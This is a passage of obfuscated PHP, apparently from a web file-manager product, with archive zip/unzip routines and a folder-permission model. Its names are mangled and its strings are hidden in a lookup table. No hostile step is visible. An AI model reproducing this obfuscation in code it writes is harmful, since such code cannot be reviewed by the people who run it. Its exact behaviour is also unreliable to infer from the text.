(is_string($Ã‡Şê÷ğ) && $Ã‡Şê÷ğ) { $Ã‡Şê÷ğ = array(array($ÄÄ¸¯†á[86] => $Ã‡Şê÷ğ)); } $¼£È€† = self::init($Ã‡Şê÷ğ[0][$ÄÄ¸¯†á[86]]); $È°ÒÈİÛ = self::info($Ã‡Şê÷ğ[0][$ÄÄ¸¯†á[86]]); $¬¨ïğéû = $ÄÄ¸¯†á[12]; $ÌÕÃËÚ = $ÄÄ¸¯†á[12]; $ËŒàÓ©¦ = $ÄÄ¸¯†á[12]; if ($ÁÁÃ‚Ñ’ && substr($ÁÁÃ‚Ñ’, -1, 1) != $ÄÄ¸¯†á[8]) { $ÌÕÃËÚ = get_path_father($ÁÁÃ‚Ñ’); $ËŒàÓ©¦ = get_path_this($ÁÁÃ‚Ñ’); } else { $ÌÕÃËÚ = self::pathFather($È°ÒÈİÛ[$ÄÄ¸¯†á[86]]); $ËŒàÓ©¦ = $È°ÒÈİÛ[$ÄÄ¸¯†á[32]] . $ÄÄ¸¯†á[10] . $ïĞñº¹§; if (count($Ã‡Şê÷ğ) > 1) { $ŒŸŸ¬ËÙ = IO::info($ÌÕÃËÚ); $ËŒàÓ©¦ = $ŒŸŸ¬ËÙ[$ÄÄ¸¯†á[32]] . $ÄÄ¸¯†á[10] . $ïĞñº¹§; } if ($ÁÁÃ‚Ñ’) { $ÌÕÃËÚ = $ÁÁÃ‚Ñ’; } } if ($¼£È€†->getType() == $ÄÄ¸¯†á[108]) { $¬é‘™§ = self::init($ÌÕÃËÚ); $©Ó»Íµ° = $¬é‘™§->getType() == $ÄÄ¸¯†á[108] ? $ÌÕÃËÚ : get_path_father($¼£È€†->path); $©Ó»Íµ° = rtrim($©Ó»Íµ°, $ÄÄ¸¯†á[8]) . $ÄÄ¸¯†á[8]; mk_dir($©Ó»Íµ°); } else { $¬¨ïğéû = TEMP_FILES . $ÄÄ¸¯†á[1234] . time() . rand_string(8) . $ÄÄ¸¯†á[8]; mk_dir($¬¨ïğéû); file_put_contents($¬¨ïğéû . $ÄÄ¸¯†á[1235], $ÄÄ¸¯†á[12]); $©Ó»Íµ° = $¬¨ïğéû; } $—¯ÉùÈš = IO::info($©Ó»Íµ°); if (!$—¯ÉùÈš || !$—¯ÉùÈš[$ÄÄ¸¯†á[219]]) { show_json(LNG($ÄÄ¸¯†á[1236]), !1); } $°¡Õ§ù§ = self::zipFileList($Ã‡Şê÷ğ, $¬¨ïğéû); foreach ($°¡Õ§ù§ as $şÈ‰¯ç‰ => $£úØÄİ¡) { $°¡Õ§ù§[$şÈ‰¯ç‰] = self::iconvSystem($£úØÄİ¡); } $å›Ãêë = get_filename_auto($©Ó»Íµ° . $ËŒàÓ©¦, $ÄÄ¸¯†á[12], $°Ë½ÉŸå); KodArchive::create(self::iconvSystem($å›Ãêë), $°¡Õ§ù§); if (!IO::exist($å›Ãêë)) { if ($¬¨ïğéû) { del_dir($¬¨ïğéû); } show_json(LNG($ÄÄ¸¯†á[1237]), !1); } if (!$¬¨ïğéû) { return $å›Ãêë; } $œ¹‡ÎÁ = self::move($å›Ãêë, $ÌÕÃËÚ, $°Ë½ÉŸå); if ($¬¨ïğéû) { del_dir($¬¨ïğéû); } if (!$å›Ãêë) { show_json(LNG($ÄÄ¸¯†á[1237]), !1); } return $œ¹‡ÎÁ; } public static function unzip($¬©ÖÌ¿ç, $¬¨ÎÒğÚ, $ùİÔ™¡ = "\x2d\x31", $éˆÚ°ƒŸ = "\x72\145\x70\x6c\x61\143\x65") { $Íëú…¸ =& $_SERVER[•Ùç É]; $Ó°«ß» = parent::info($¬©ÖÌ¿ç); if (!$Ó°«ß») { show_json(LNG($Íëú…¸[1238]), !1); } $¬ªìĞÌÒ = IO::infoFullSimple($¬¨ÎÒğÚ); if (!$¬ªìĞÌÒ) { $¬¨ÎÒğÚ = IO::mkdir($¬¨ÎÒğÚ); } if (isset($¬ªìĞÌÒ[$Íëú…¸[183]]) && trim($¬ªìĞÌÒ[$Íëú…¸[86]], $Íëú…¸[8]) != trim($¬¨ÎÒğÚ, $Íëú…¸[8])) { $Ç‡ß¬ã® = KodIO::make($¬ªìĞÌÒ[$Íëú…¸[182]]); $™‚¬ö¯Î = IO::fileNameAuto($Ç‡ß¬ã®, $¬ªìĞÌÒ[$Íëú…¸[32]], REPEAT_RENAME_FOLDER, !0); $¬¨ÎÒğÚ = IO::mkdir($Ç‡ß¬ã® . $™‚¬ö¯Î); } $ùİÔ™¡ = $ùİÔ™¡ && $ùİÔ™¡ != $Íëú…¸[1239] ? @json_decode($ùİÔ™¡, !0) : -1; $êÌ—ú = self::unzipPart($¬©ÖÌ¿ç, $ùİÔ™¡); if (!$êÌ—ú || !IO::exist($êÌ—ú[$Íëú…¸[216]])) { show_json(LNG($Íëú…¸[107]), !1); } $Üâ²Âì = $êÌ—ú[$Íëú…¸[1240]][count($êÌ—ú[$Íëú…¸[1240]]) - 1]; if ($Üâ²Âì[$Íëú…¸[1241]] == -1 || substr($Üâ²Âì[$Íëú…¸[32]], -1, 1) == $Íëú…¸[8]) { $ˆ¨ÒÌ†Œ = $êÌ—ú[$Íëú…¸[1242]] . rand_string(10) . $Íëú…¸[8]; mk_dir($ˆ¨ÒÌ†Œ); $ÒÇŒºÀ¢ = count($êÌ—ú[$Íëú…¸[1240]]) == 1 ? IO::ext($¬©ÖÌ¿ç) : get_path_ext($êÌ—ú[$Íëú…¸[216]]); $¯İ«¹“£ = KodArchive::extract(self::iconvSystem($êÌ—ú[$Íëú…¸[216]]), $ˆ¨ÒÌ†Œ, $Üâ²Âì[$Íëú…¸[1241]], $™‚¬ö¯Î, $ÒÇŒºÀ¢); self::unzipErrorCheck($¯İ«¹“£, array($Íëú…¸[1243], $¬©ÖÌ¿ç, $ÒÇŒºÀ¢, $¬¨ÎÒğÚ, $êÌ—ú)); Hook::trigger($Íëú…¸[1244], $ˆ¨ÒÌ†Œ); recursion_dir($ˆ¨ÒÌ†Œ, $¶ÃÎà•®, $¡´¦¢áÙ, 0); $ıİÃ¿¾İ = array_merge($¶ÃÎà•®, $¡´¦¢áÙ); $÷Í†ëğç = array(); foreach ($ıİÃ¿¾İ as $À–ƒ†Äö) { $êÆÏŠµÏ = IO::move(self::iconvApp($À–ƒ†Äö), $¬¨ÎÒğÚ, $éˆÚ°ƒŸ); if ($êÆÏŠµÏ) { $÷Í†ëğç[] = $êÆÏŠµÏ; } } del_dir($ˆ¨ÒÌ†Œ); } else { $êÆÏŠµÏ = IO::move($êÌ—ú[$Íëú…¸[216]], $¬¨ÎÒğÚ, $éˆÚ°ƒŸ, get_path_this($Üâ²Âì[$Íëú…¸[32]])); if ($êÆÏŠµÏ) { $÷Í†ëğç[] = $êÆÏŠµÏ; } } return $÷Í†ëğç ? $÷Í†ëğç : !1; } public static function unzipList($Á£«Ú®à) { $‰”ìê¾Ó =& $_SERVER[•Ùç É]; $ßÅá°ŞÅ = isset($Á£«Ú®à[$‰”ìê¾Ó[1245]]) ? $Á£«Ú®à[$‰”ìê¾Ó[1245]] : !1; $Õ•ôñçÃ = isset($Á£«Ú®à[$‰”ìê¾Ó[1241]]) ? @json_decode($Á£«Ú®à[$‰”ìê¾Ó[1241]], !0) : -1; $·ÛØü†Ö = self::unzipPart($Á£«Ú®à[$‰”ìê¾Ó[86]], $Õ•ôñçÃ); if (!$·ÛØü†Ö || !IO::exist($·ÛØü†Ö[$‰”ìê¾Ó[216]])) { show_json(LNG($‰”ìê¾Ó[107]), !1); } $¹ôå’­º = $·ÛØü†Ö[$‰”ìê¾Ó[1240]][count($·ÛØü†Ö[$‰”ìê¾Ó[1240]]) - 1]; $•ß‰  = in_array(IO::ext($·ÛØü†Ö[$‰”ìê¾Ó[216]]), array($‰”ìê¾Ó[359], $‰”ìê¾Ó[1246], $‰”ìê¾Ó[1247], $‰”ìê¾Ó[1248], $‰”ìê¾Ó[1249], $‰”ìê¾Ó[1250])); if (!$ßÅá°ŞÅ && ($¹ôå’­º[$‰”ìê¾Ó[1241]] == -1 || $•ß‰ )) { $å×¡â®Š = $·ÛØü†Ö[$‰”ìê¾Ó[1242]] . get_path_this($·ÛØü†Ö[$‰”ìê¾Ó[216]]) . $‰”ìê¾Ó[1251]; if (!IO::exist($å×¡â®Š)) { $¤º…¥¿µ = $¹ôå’­º[$‰”ìê¾Ó[1241]] == -1 ? get_path_ext(IO::pathThis($Á£«Ú®à[$‰”ìê¾Ó[86]])) : get_path_ext($·ÛØü†Ö[$‰”ìê¾Ó[216]]); $®¾Çğû = KodArchive::listContent(self::iconvSystem($·ÛØü†Ö[$‰”ìê¾Ó[216]]), !0, $¤º…¥¿µ); self::unzipErrorCheck($®¾Çğû, array($‰”ìê¾Ó[1252], $Á£«Ú®à, $·ÛØü†Ö)); @file_put_contents($å×¡â®Š, json_encode($®¾Çğû[$‰”ìê¾Ó[1253]])); } return @json_decode(IO::getContent($å×¡â®Š), !0); } IO::fileOut($·ÛØü†Ö[$‰”ìê¾Ó[216]], $ßÅá°ŞÅ, get_path_this($¹ôå’­º[$‰”ìê¾Ó[32]])); die; } private static function zipFileList($ıéŸ¡ã, $ŸåˆÆ¸ = false) { $­»¡è“³ =& $_SERVER[•Ùç É]; $©˜Åå¯ı = array(); foreach ($ıéŸ¡ã as $Íä¤Ú§Ô) { $—îÉÍ³Ò = $Íä¤Ú§Ô[$­»¡è“³[86]]; if ($ŸåˆÆ¸) { $—îÉÍ³Ò = self::copy($Íä¤Ú§Ô[$­»¡è“³[86]], $ŸåˆÆ¸, $­»¡è“³[863]); } else { $¸ÅÎŠ€ñ = self::init($Íä¤Ú§Ô[$­»¡è“³[86]]); if ($¸ÅÎŠ€ñ->getType() == $­»¡è“³[108]) { $—îÉÍ³Ò = $¸ÅÎŠ€ñ->path; } } if ($—îÉÍ³Ò && self::local()->exist($—îÉÍ³Ò)) { $©˜Åå¯ı[$Íä¤Ú§Ô[$­»¡è“³[86]]] = $—îÉÍ³Ò; } } if (!empty($©˜Åå¯ı)) { return array_values($©˜Åå¯ı); } show_json(LNG($­»¡è“³[1216]), !1); } private static function localFilePath($«£Õİö­) { $É‰õô‹ô =& $_SERVER[•Ùç É]; $Ñ²Èœ×÷ = KodIO::parse($«£Õİö­); if ($Ñ²Èœ×÷[$É‰õô‹ô[33]] == KodIO::KOD_SOURCE) { $â›¶ûÜ = Model($É‰õô‹ô[870])->fileInfoGet(KodIO::sourceID($«£Õİö­)); if (!$â›¶ûÜ[$É‰õô‹ô[86]]) { show_json($É‰õô‹ô[1254], !1); } $«£Õİö­ = $â›¶ûÜ[$É‰õô‹ô[86]]; } $Ê›ß¬ú = self::init($«£Õİö­); if ($Ê›ß¬ú->pathParse[$É‰õô‹ô[1202]]) { $«£Õİö­ = $Ê›ß¬ú->pathParse[$É‰õô‹ô[1202]]; $Ê›ß¬ú = self::init($«£Õİö­); } $ûÈí§áĞ = $Ê›ß¬ú->getType(); if ($ûÈí§áĞ == $É‰õô‹ô[108] || $ûÈí§áĞ == $É‰õô‹ô[1255]) { if (!$Ê›ß¬ú->exist($Ê›ß¬ú->path)) { show_json(LNG($É‰õô‹ô[107]), !1); } return $Ê›ß¬ú->path; } return !1; } public static function unzipPart($üÊ‹ÃÃ˜, $¦úÛÒØÄ = -1) { $ƒ³Êò =& $_SERVER[•Ùç É]; $ÃóÕè¦° = IO::pathThis($üÊ‹ÃÃ˜); if (!$¦úÛÒØÄ || $¦úÛÒØÄ == -1) { $ŞÄ¥†Ôµ = array(array($ƒ³Êò[32] => $ÃóÕè¦°, $ƒ³Êò[1241] => -1)); $ŞÄ¥†Ôµ[0][$ƒ³Êò[1256]] = $ŞÄ¥†Ôµ[0][$ƒ³Êò[32]]; } else { if (is_array($¦úÛÒØÄ)) { $ŞÄ¥†Ôµ = $¦úÛÒØÄ; $×¸…õÜ« = count($ŞÄ¥†Ôµ) - 1; for ($¼Š»òãŸ = 0; $¼Š»òãŸ <= $×¸…õÜ«; $¼Š»òãŸ++) { $­İ£Çï® = $ŞÄ¥†Ôµ[$¼Š»òãŸ]; $Ş¯ùíñø = get_path_this($­İ£Çï®[$ƒ³Êò[32]]) . (checkExtSafe($­İ£Çï®[$ƒ³Êò[32]]) ? $ƒ³Êò[12] : $ƒ³Êò[1257]); $ŞÄ¥†Ôµ[$¼Š»òãŸ][$ƒ³Êò[1256]] = $ƒ³Êò[1258] . intval($­İ£Çï®[$ƒ³Êò[1241]]) . $ƒ³Êò[432] . $Ş¯ùíñø; if ($¼Š»òãŸ == 0) { continue; } $ŞÄ¥†Ôµ[$¼Š»òãŸ][$ƒ³Êò[1256]] = $ŞÄ¥†Ôµ[$¼Š»òãŸ - 1][$ƒ³Êò[1256]] . $ƒ³Êò[1259] . $ŞÄ¥†Ôµ[$¼Š»òãŸ][$ƒ³Êò[1256]]; } } } if (!is_array($ŞÄ¥†Ôµ) || count($ŞÄ¥†Ôµ) == 0) { return !1; } $ã²Àíê = $ŞÄ¥†Ôµ[count($ŞÄ¥†Ôµ) - 1]; if (!IO::exist($üÊ‹ÃÃ˜)) { return !1; } $˜óçê‡œ = TEMP_FILES . $ƒ³Êò[1260] . kodIO::hashPathSafe($üÊ‹ÃÃ˜) . $ƒ³Êò[8]; $ªéÁøÊ = $˜óçê‡œ . $ã²Àíê[$ƒ³Êò[1256]]; mk_dir($˜óçê‡œ); file_put_contents(TEMP_FILES . $ƒ³Êò[1235], $ƒ³Êò[12]); if (IO::exist($ªéÁøÊ)) { return array($ƒ³Êò[216] => $ªéÁøÊ, $ƒ³Êò[1240] => $ŞÄ¥†Ôµ, $ƒ³Êò[1242] => $˜óçê‡œ); } $³ˆ‡Êı = self::localFilePath($üÊ‹ÃÃ˜); if (!$³ˆ‡Êı) { $³ˆ‡Êı = $˜óçê‡œ . $ƒ³Êò[1261]; if (!IO::exist($³ˆ‡Êı)) { self::copy($üÊ‹ÃÃ˜, $˜óçê‡œ, !1, get_path_this($³ˆ‡Êı)); } } if (!$³ˆ‡Êı || !IO::exist($³ˆ‡Êı)) { return !1; } if ($ã²Àíê[$ƒ³Êò[1241]] == -1) { return array($ƒ³Êò[216] => $³ˆ‡Êı, $ƒ³Êò[1240] => $ŞÄ¥†Ôµ, $ƒ³Êò[1242] => $˜óçê‡œ); } $Š­Œµ‹ù = $³ˆ‡Êı; foreach ($ŞÄ¥†Ôµ as $¼Š»òãŸ => $­İ£Çï®) { if (!$­İ£Çï® || $­İ£Çï®[$ƒ³Êò[1241]] == $ƒ³Êò[1239]) { break; } if (substr($­İ£Çï®[$ƒ³Êò[32]], -1, 1) == $ƒ³Êò[8]) { break; } $é„•’õº = in_array(get_path_ext($­İ£Çï®[$ƒ³Êò[1256]]), array($ƒ³Êò[359], $ƒ³Êò[1246], $ƒ³Êò[1247], $ƒ³Êò[1248], $ƒ³Êò[1249], $ƒ³Êò[1250])); $º‘Ä´šï = $¼Š»òãŸ == count($ŞÄ¥†Ôµ) - 1 && $é„•’õº; $Ğß˜İŞô = $˜óçê‡œ . $­İ£Çï®[$ƒ³Êò[1256]]; $òš”ÚšÀ = $˜óçê‡œ . get_path_this($­İ£Çï®[$ƒ³Êò[32]]); if (IO::exist($Ğß˜İŞô)) { $Š­Œµ‹ù = $Ğß˜İŞô; continue; } $à‘–îã¢ = $¼Š»òãŸ == 0 ? get_path_ext($ÃóÕè¦°) : get_path_ext($Š­Œµ‹ù); $ê¤ÅôÈö = KodArchive::extract(self::iconvSystem($Š­Œµ‹ù), $˜óçê‡œ, $­İ£Çï®[$ƒ³Êò[1241]], $Ï¹¡¤, $à‘–îã¢); self::unzipErrorCheck($ê¤ÅôÈö, array($ƒ³Êò[1262], $üÊ‹ÃÃ˜, $ŞÄ¥†Ôµ, $­İ£Çï®, $Ğß˜İŞô)); if (IO::exist($òš”ÚšÀ)) { IO::rename($òš”ÚšÀ, get_path_this($Ğß˜İŞô)); } $Š­Œµ‹ù = $Ğß˜İŞô; } $ªéÁøÊ = $Š­Œµ‹ù; return array($ƒ³Êò[216] => $Š­Œµ‹ù, $ƒ³Êò[1240] => $ŞÄ¥†Ôµ, $ƒ³Êò[1242] => $˜óçê‡œ); } private static function unzipErrorCheck($ÙÕšÄ‹İ, $ôñÒ¹µŸ = false) { $í³ËªŞÄ =& $_SERVER[•Ùç É]; if ($ÙÕšÄ‹İ[$í³ËªŞÄ[1263]]) { return !0; } write_log(array($í³ËªŞÄ[1264], $ÙÕšÄ‹İ, $ôñÒ¹µŸ), $í³ËªŞÄ[1265]); show_json($í³ËªŞÄ[1266] . json_encode($ÙÕšÄ‹İ[$í³ËªŞÄ[1253]]), !1); die; } } goto bƒ¦¾ŠÙ‘„; dî‰‡ìô¤É: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\x65\137\x61\165\x74\150"; public function getAuth($¡Úåõ´‹) { $ÖæºòŠ =& $_SERVER[•Ùç É]; $ıî¶ı‘å = $this->sourceAuthSelect($¡Úåõ´‹); $‰²Ïú‚€ = array(); $§ÄşÍ¸ı = array(); $ó¶ô¦İ­ = 2 << 25; foreach ($ıî¶ı‘å as $œÔÈ°÷€) { $å¬Êä»Ë = Model($ÖæºòŠ[542])->listData($œÔÈ°÷€[$ÖæºòŠ[2008]]); if (!$å¬Êä»Ë) { continue; } $‰²Ïú‚€[] = $œÔÈ°÷€; $„¿‚É¨¿ = 0; if ($œÔÈ°÷€[$ÖæºòŠ[180]] == SourceModel::TYPE_GROUP) { $„¿‚É¨¿ = $ó¶ô¦İ­ * 2; } if ($œÔÈ°÷€[$ÖæºòŠ[180]] == SourceModel::TYPE_USER) { $„¿‚É¨¿ = $ó¶ô¦İ­; } if ($œÔÈ°÷€[$ÖæºòŠ[180]] == SourceModel::TYPE_USER && $œÔÈ°÷€[$ÖæºòŠ[540]] == $ÖæºòŠ[214]) { $„¿‚É¨¿ = 0; } $§ÄşÍ¸ı[] = $å¬Êä»Ë[$ÖæºòŠ[457]] + $„¿‚É¨¿; } array_multisort($§ÄşÍ¸ı, SORT_DESC, $‰²Ïú‚€); return $‰²Ïú‚€; } public function sourceAuthSelect($•“ëŒşá) { $İ™÷½ÚÜ =& $_SERVER[•Ùç É]; static $ĞİşŸû› = array(); $”ÂŞœ²„ = is_array($•“ëŒşá) ? !1 : !0; if ($”ÂŞœ²„) { $•“ëŒşá = array($•“ëŒşá); } $úÕÍĞŞ = array(); foreach ($•“ëŒşá as $æåÜµ¿¢) { if (isset($ĞİşŸû›[$æåÜµ¿¢])) { $úÕÍĞŞ[$æåÜµ¿¢] = $ĞİşŸû›[$æåÜµ¿¢]; } } if (count($úÕÍĞŞ) == count($•“ëŒşá)) { return $”ÂŞœ²„ ? $úÕÍĞŞ[$•“ëŒşá[0]] : $úÕÍĞŞ; } $»Ñù†Ó = $İ™÷½ÚÜ[2085]; $èà±¬Ñµ = array($İ™÷½ÚÜ[183] => array($İ™÷½ÚÜ[7], $•“ëŒşá)); $í¬Îµêô = $this->field($»Ñù†Ó)->order($İ™÷½ÚÜ[445])->where($èà±¬Ñµ)->select(); $Èûí¶ş = array_to_keyvalue_group($í¬Îµêô, $İ™÷½ÚÜ[183]); foreach ($•“ëŒşá as $æåÜµ¿¢) { $ĞİşŸû›[$æåÜµ¿¢] = $Èûí¶ş[$æåÜµ¿¢] ? $Èûí¶ş[$æåÜµ¿¢] : array(); } if ($”ÂŞœ²„) { return $í¬Îµêô; } return $Èûí¶ş; } public function setAuth($¸Ö‘Ğ˜Ê, $¨¢èŞ¿ï) { $÷Ÿ•·¦€ =& $_SERVER[•Ùç É]; $÷“äåĞ³ = Model($÷Ÿ•·¦€[1384])->sourceInfo($¸Ö‘Ğ˜Ê); if (!$÷“äåĞ³) { return !1; } if ($÷“äåĞ³[$÷Ÿ•·¦€[180]] != SourceModel::TYPE_GROUP) { return !1; } $÷õ…ê÷´ = 1; $’õï°‰ = $÷“äåĞ³[$÷Ÿ•·¦€[540]]; if ($’õï°‰ != $÷õ…ê÷´) { $Ë¨Ù‹³¾ = array($÷Ÿ•·¦€[1904] => $’õï°‰); $»£ÛÄ”– = Model($÷Ÿ•·¦€[1994])->field($÷Ÿ•·¦€[1705])->where($Ë¨Ù‹³¾)->select(); $»£ÛÄ”– = array_to_keyvalue($»£ÛÄ”–, $÷Ÿ•·¦€[12], $÷Ÿ•·¦€[1705]); } $•ÚÏÖá‘ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ıÑÊ¶ôº = array(); foreach ($¨¢èŞ¿ï as $ÃĞ³³Üæ) { if (!in_array($ÃĞ³³Üæ[$÷Ÿ•·¦€[180]], $•ÚÏÖá‘)) { show_json(LNG($÷Ÿ•·¦€[2086]), !1); } if ($’õï°‰ != $÷õ…ê÷´) { if ($ÃĞ³³Üæ[$÷Ÿ•·¦€[180]] == SourceModel::TYPE_GROUP) { } if ($ÃĞ³³Üæ[$÷Ÿ•·¦€[540]] != 0 && !in_array($ÃĞ³³Üæ[$÷Ÿ•·¦€[540]], $»£ÛÄ”–)) { } } if ($ÃĞ³³Üæ[$÷Ÿ•·¦€[540]] == 0) { $ÃĞ³³Üæ[$÷Ÿ•·¦€[180]] = SourceModel::TYPE_USER; } $ıÑÊ¶ôº[] = array($÷Ÿ•·¦€[183] => $¸Ö‘Ğ˜Ê, $÷Ÿ•·¦€[180] => intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[180]]), $÷Ÿ•·¦€[540] => intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[540]]), $÷Ÿ•·¦€[2008] => intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[2008]]) ? intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[2008]]) : 0, $÷Ÿ•·¦€[2068] => intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[2068]]) ? intval($ÃĞ³³Üæ[$÷Ÿ•·¦€[2068]]) : -1); } $this->where(array($÷Ÿ•·¦€[461] => $¸Ö‘Ğ˜Ê))->delete(); $this->addAll($ıÑÊ¶ôº); return !0; } public function authClear($ÅíÁ‡Êí) { $ÏËš¸öô =& $_SERVER[•Ùç É]; $—ÎãÑ†Ÿ = Model($ÏËš¸öô[1384])->sourceInfo($ÅíÁ‡Êí); $çô˜¤ = array($ÅíÁ‡Êí); if ($—ÎãÑ†Ÿ[$ÏËš¸öô[455]] == $ÏËš¸öô[90]) { $©¬Äöª£ = array($ÏËš¸öô[622] => array($ÏËš¸öô[582], $—ÎãÑ†Ÿ[$ÏËš¸öô[555]] . $ÅíÁ‡Êí . $ÏËš¸öô[583])); $çô˜¤ = Model($ÏËš¸öô[1384])->field($ÏËš¸öô[461])->where($©¬Äöª£)->getField($ÏËš¸öô[183], !0); $çô˜¤[] = $ÅíÁ‡Êí; } $this->where(array($ÏËš¸öô[461] => array($ÏËš¸öô[462], $çô˜¤)))->delete(); return !0; } public function getAllChildren($ñ÷çÔ—) { $©ëŞ§¿õ =& $_SERVER[•Ùç É]; $ğ´½´Šõ = Model($©ëŞ§¿õ[1384])->sourceInfo($ñ÷çÔ—); if ($ğ´½´Šõ[$©ëŞ§¿õ[455]] != $©ëŞ§¿õ[90]) { return $this->sourceListAuth(array($ñ÷çÔ—)); } if ($ğ´½´Šõ[$©ëŞ§¿õ[180]] != SourceModel::TYPE_GROUP) { return array(); } $º§ÔÁúÆ = 1; $¡Ó¯ä× = array($ñ÷çÔ—); if ($ğ´½´Šõ[$©ëŞ§¿õ[182]] == $©ëŞ§¿õ[214] && $ğ´½´Šõ[$©ëŞ§¿õ[540]] != $º§ÔÁúÆ) { $¡Ó¯ä× = $this->groupChidldAllRootSource($ğ´½´Šõ[$©ëŞ§¿õ[540]]); } $Â¸‘ß˜˜ = $this->field($©ëŞ§¿õ[183])->group($©ëŞ§¿õ[183])->select(); $Â¸‘ß˜˜ = array_to_keyvalue($Â¸‘ß˜˜, $©ëŞ§¿õ[12], $©ëŞ§¿õ[183]); if (!$Â¸‘ß˜˜) { return array(); } $¼½€äİŞ = $©ëŞ§¿õ[2087]; $¹ª±´À» = array($©ëŞ§¿õ[183] => array($©ëŞ§¿õ[7], $Â¸‘ß˜˜), $©ëŞ§¿õ[475] => $©ëŞ§¿õ[214]); $êÜû§©ú = Model($©ëŞ§¿õ[870])->field($¼½€äİŞ)->where($¹ª±´À»)->select(); $•¿©—ç¹ = array($ñ÷çÔ—); foreach ($êÜû§©ú as $œãÙì³ó) { foreach ($¡Ó¯ä× as $¡ÂñäâŸ) { $ìÑØŸ¢È = $©ëŞ§¿õ[50] . $¡ÂñäâŸ . $©ëŞ§¿õ[50]; $çğ‚”Ôì = $œãÙì³ó[$©ëŞ§¿õ[555]] . $œãÙì³ó[$©ëŞ§¿õ[183]] . $©ëŞ§¿õ[50]; if (strstr($çğ‚”Ôì, $ìÑØŸ¢È)) { $•¿©—ç¹[] = $œãÙì³ó[$©ëŞ§¿õ[183]]; break; } } } return $this->sourceListAuth($•¿©—ç¹); } private function sourceListAuth($ã‘Ô²µÀ) { $ô‹Ëäè— =& $_SERVER[•Ùç É]; $Ûïò›®ë = Model($ô‹Ëäè—[1384])->sourceListInfo($ã‘Ô²µÀ, !0); $Áñˆ ƒ = $this->sourceAuthSelect($ã‘Ô²µÀ); $éËÓ¸ù = array(); $çôúÉ‚ = array(); foreach ($Ûïò›®ë as $©É›´ˆù) { unset($©É›´ˆù[$ô‹Ëäè—[499]]); unset($©É›´ˆù[$ô‹Ëäè—[497]]); unset($©É›´ˆù[$ô‹Ëäè—[457]]); unset($©É›´ˆù[$ô‹Ëäè—[89]]); $î˜­¸Ö = $Áñˆ ƒ[$©É›´ˆù[$ô‹Ëäè—[183]]]; if (!$î˜­¸Ö) { continue; } $©É›´ˆù[$ô‹Ëäè—[2088]] = $this->authTargetInfo($î˜­¸Ö); $©É›´ˆù[$ô‹Ëäè—[553]] = rtrim($©É›´ˆù[$ô‹Ëäè—[559]], $ô‹Ëäè—[8]) . $ô‹Ëäè—[8] . ltrim($©É›´ˆù[$ô‹Ëäè—[553]], $ô‹Ëäè—[8]); $éËÓ¸ù[] = $©É›´ˆù; $Ú¶½Š€” = count(explode($ô‹Ëäè—[8], trim($©É›´ˆù[$ô‹Ëäè—[553]], $ô‹Ëäè—[8]))); $çôúÉ‚[] = $Ú¶½Š€” + ($©É›´ˆù[$ô‹Ëäè—[33]] == $ô‹Ëäè—[77] ? 0 : 1000); } array_multisort($çôúÉ‚, SORT_ASC, $éËÓ¸ù); return $éËÓ¸ù; } private function groupChidldAllRootSource($‡›”£‹) { $Ş©´Ô… =& $_SERVER[•Ùç É]; $ûş…µÃ = Model($Ş©´Ô…[2089])->groupChildrenAll($‡›”£‹); $İ”Óöú® = array($Ş©´Ô…[182] => 0, $Ş©´Ô…[540] => array($Ş©´Ô…[7], $ûş…µÃ), $Ş©´Ô…[180] => SourceModel::TYPE_GROUP); $Å¹âĞ‡Õ = Model($Ş©´Ô…[870])->field($Ş©´Ô…[183])->where($İ”Óöú®)->select(); $Å¹âĞ‡Õ = array_to_keyvalue($Å¹âĞ‡Õ, $Ş©´Ô…[12], $Ş©´Ô…[183]); return $Å¹âĞ‡Õ; } private function authTargetInfo($úÎ¢ùîí) { $˜­«ãáª =& $_SERVER[•Ùç É]; $™ä–·¼ = array(); $ÊÁó‚å¶ = array(); $•ëéî¦Ë = 2 << 25; foreach ($úÎ¢ùîí as $„íÔõğ) { $Óåğ ²û = Model($˜­«ãáª[542])->listData($„íÔõğ[$˜­«ãáª[2008]]); if (!$Óåğ ²û) { continue; } if ($„íÔõğ[$˜­«ãáª[180]] == SourceModel::TYPE_USER) { $äóâğÌ× = Model($˜­«ãáª[548])->getInfoSimpleOuter($„íÔõğ[$˜­«ãáª[540]]); if ($äóâğÌ×[$˜­«ãáª[1705]] == $˜­«ãáª[1239]) { continue; } if ($äóâğÌ×[$˜­«ãáª[1705]] == $˜­«ãáª[214]) { $äóâğÌ×[$˜­«ãáª[32]] = LNG($˜­«ãáª[2090]); } } else { $äóâğÌ× = Model($˜­«ãáª[556])->getInfoSimple($„íÔõğ[$˜­«ãáª[540]]); } if (!$äóâğÌ×) { continue; } $äóâğÌ×[$˜­«ãáª[510]] = $Óåğ ²û; $™ä–·¼[] = $äóâğÌ×; $¨²ùşÍ = 0; if ($„íÔõğ[$˜­«ãáª[180]] == SourceModel::TYPE_GROUP) { $¨²ùşÍ = $•ëéî¦Ë * 2; } if ($„íÔõğ[$˜­«ãáª[180]] == SourceModel::TYPE_USER) { $¨²ùşÍ = $•ëéî¦Ë; } if ($„íÔõğ[$˜­«ãáª[180]] == SourceModel::TYPE_USER && $„íÔõğ[$˜­«ãáª[540]] == $˜­«ãáª[214]) { $¨²ùşÍ = 0; } $ÊÁó‚å¶[] = $Óåğ ²û[$˜­«ãáª[457]] + $¨²ùşÍ; } array_multisort($ÊÁó‚å¶, SORT_DESC, $™ä–·¼); return $™ä–·¼; } public function getAllChildrenByUser($ÒÒ©û§Ü, $€ñš–á) { $„ËÎóÖ÷ =& $_SERVER[•Ùç É]; $†äÇ¿É¼ = Model($„ËÎóÖ÷[569])->getInfo($€ñš–á); if (!$€ñš–á || !$ÒÒ©û§Ü || !$†äÇ¿É¼) { return array(); } $¨Õõ‹¥û = Model($„ËÎóÖ÷[1384])->sourceInfo($ÒÒ©û§Ü); $íôºêçß = array(); $éİ×¾‰ş = 1; if ($¨Õõ‹¥û[$„ËÎóÖ÷[182]] == $„ËÎóÖ÷[214] && $¨Õõ‹¥û[$„ËÎóÖ÷[540]] != $éİ×¾‰ş && $this->groupContainUser($¨Õõ‹¥û[$„ËÎóÖ÷[540]], $€ñš–á)) { foreach ($†äÇ¿É¼[$„ËÎóÖ÷[2091]] as $ş—‰ÊõÕ) { 